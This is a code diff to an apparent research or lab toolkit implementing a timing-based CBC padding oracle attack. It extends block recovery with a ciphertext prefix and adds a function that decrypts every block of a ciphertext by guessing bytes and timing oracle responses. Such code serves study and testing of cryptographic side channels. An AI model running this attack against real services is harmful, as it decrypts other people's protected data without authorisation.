@@ -29,14 +29,23 @@ class Score:
         return self.total / self.samples
 
 
-def recover_block_timing(prev: bytes, curr: bytes, oracle: TimingOracle, config: TimingConfig) -> tuple[bytes, int]:
+def recover_block_timing(
+    prev: bytes,
+    curr: bytes,
+    oracle: TimingOracle,
+    config: TimingConfig,
+    prefix: bytes = b"",
+) -> tuple[bytes, int]:
     cfg = config.normalized()
     if len(prev) != crypto.BLOCK_SIZE or len(curr) != crypto.BLOCK_SIZE:
         raise AttackError("recover_block_timing requires two 16-byte blocks")
+    if len(prefix) % crypto.BLOCK_SIZE != 0:
+        raise AttackError("prefix must be a multiple of 16 bytes")
 
     intermediate = bytearray(crypto.BLOCK_SIZE)
     plaintext = bytearray(crypto.BLOCK_SIZE)
     queries = 0
+    prefix_bytes = bytes(prefix)
 
     for pos in range(crypto.BLOCK_SIZE - 1, -1, -1):
         pad = crypto.BLOCK_SIZE - pos
@@ -48,7 +57,7 @@ def recover_block_timing(prev: bytes, curr: bytes, oracle: TimingOracle, config:
         for guess in range(256):
             candidate_prev = bytearray(base)
             candidate_prev[pos] = guess
-            forged = bytes(candidate_prev) + curr
+            forged = prefix_bytes + bytes(candidate_prev) + curr
 
             total = _sample_duration_ns(oracle, forged, cfg.initial_samples)
             queries += cfg.initial_samples
@@ -85,9 +94,45 @@ def recover_ciphertext_block_timing(
     if block_index < 1 or block_index >= num_blocks:
         raise AttackError(f"block index {block_index} out of range")
 
-    prev = ciphertext[(block_index - 1) * crypto.BLOCK_SIZE : block_index * crypto.BLOCK_SIZE]
-    curr = ciphertext[block_index * crypto.BLOCK_SIZE : (block_index + 1) * crypto.BLOCK_SIZE]
-    return recover_block_timing(prev, curr, oracle, config)
+    prev_start = (block_index - 1) * crypto.BLOCK_SIZE
+    prev_end = block_index * crypto.BLOCK_SIZE
+    curr_end = (block_index + 1) * crypto.BLOCK_SIZE
+
+    prefix = ciphertext[:prev_start]
+    prev = ciphertext[prev_start:prev_end]
+    curr = ciphertext[prev_end:curr_end]
+    return recover_block_timing(prev, curr, oracle, config, prefix=prefix)
+
+
+def recover_plaintext_timing(
+    ciphertext: bytes,
+    oracle: TimingOracle,
+    config: TimingConfig,
+) -> tuple[bytes, int]:
+    if len(ciphertext) < 2 * crypto.BLOCK_SIZE or len(ciphertext) % crypto.BLOCK_SIZE != 0:
+        raise AttackError("ciphertext must include IV and be a multiple of 16 bytes")
+
+    num_blocks = len(ciphertext) // crypto.BLOCK_SIZE
+    # Hard-coded traversal: recover from last ciphertext block to first.
+    indices = range(num_blocks - 1, 0, -1)
+
+    recovered_blocks: dict[int, bytes] = {}
+    total_queries = 0
+
+    for block_index in indices:
+        block, queries = recover_ciphertext_block_timing(
+            ciphertext,
+            block_index,
+            oracle,
+            config,
+        )
+        recovered_blocks[block_index] = block
+        total_queries += queries
+
+    out = bytearray()
+    for block_index in range(1, num_blocks):
+        out.extend(recovered_blocks[block_index])
+    return bytes(out), total_queries
 
 
 def _sample_duration_ns(oracle: TimingOracle, ciphertext: bytes, samples: int) -> int:
